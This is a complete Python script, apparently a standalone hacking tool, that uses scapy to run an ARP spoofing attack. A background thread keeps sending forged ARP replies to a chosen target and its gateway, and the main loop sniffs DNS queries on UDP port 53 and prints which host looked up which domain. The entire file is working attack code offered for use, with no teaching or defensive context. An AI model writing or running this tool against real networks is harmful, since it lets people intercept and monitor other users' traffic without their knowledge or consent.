import logging
from scapy.all import ARP, send, sniff
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import IP
import threading

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

ip_target = input('Enter the ip target: ')
ip_gateway = input('Enter the ip gatway: ')

def arp_spoof(ip_target, ip_src):
    packet = ARP(
        op=2,
        pdst=ip_target,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=ip_src
    )
    send(packet, verbose=False)

def dns(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dnsQ = packet[DNSQR].qname.decode()
        print(ip_src,dnsQ)

def start(ip_target, ip_gateway):
    while True:
        arp_spoof(ip_target, ip_gateway)
        arp_spoof(ip_gateway, ip_target)

threading.Thread(
    target=start,
    args=(ip_target, ip_gateway),
    daemon=True
).start()

print("Network Traffic : 2026")
print("-" * 40)
print(f"{'IP ADDRESS:'}\t{'DNS QUERY:'}")
print("-" * 40)
sniff(filter="udp port 53", prn=dns, store=0)
print("Copyright © 2026 Anonymous")
